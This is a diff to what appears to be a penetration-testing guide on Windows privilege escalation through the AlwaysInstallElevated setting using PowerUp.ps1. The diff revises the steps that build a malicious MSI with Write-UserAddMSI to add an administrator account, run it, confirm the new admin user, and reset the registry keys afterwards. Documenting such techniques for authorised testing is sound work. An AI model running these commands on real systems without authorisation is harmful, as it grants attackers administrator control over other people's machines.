@@ -54,21 +54,18 @@ Powerup.ps1 is a PowerShell script that escalates privileges by adding users, ch
    ![image](https://github.com/user-attachments/assets/e8a8450e-323a-450b-96dc-02376af54343)
 7. Then to exploit the vulnerability, generate a malicious MSI with the `Write-UserAddMSI` command that adds a user with administrator privileges to the system
    ```
-   Write-UserAddMSI -UserName "maluser" -Password "pwd123" -Path "C:\Windows\Temp\exploit.msi"
+   Write-UserAddMSI
    ```
 8. Run the MSI file by executing it on the target machine
    ```
-   msiexec /quiet /i C:\Windows\Temp\exploit.msi
+   .\UserAdd.msi
    ```
-9. To confirm the new user has been created and added to the Administrators group, run the command
+9. To check if the user exists and has administrative rights, run
    ```
-   Get-LocalUser | Where-Object { $_.Name -eq "maluser" }
+   net user
+   net localgroup administrators
    ```
-10. To check if the user has administrative rights, run
-    ```
-    net localgroup administrators
-    ```
-11. (Optional) After completion of the tests, to disable AlwaysInstallElevated, set the registry keys back to 0
+10. (Optional) After completion of the tests, to disable AlwaysInstallElevated, set the registry keys back to 0
    ```
    # Disable AlwaysInstallElevated for Local Machine
    $regPathLM = "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer"
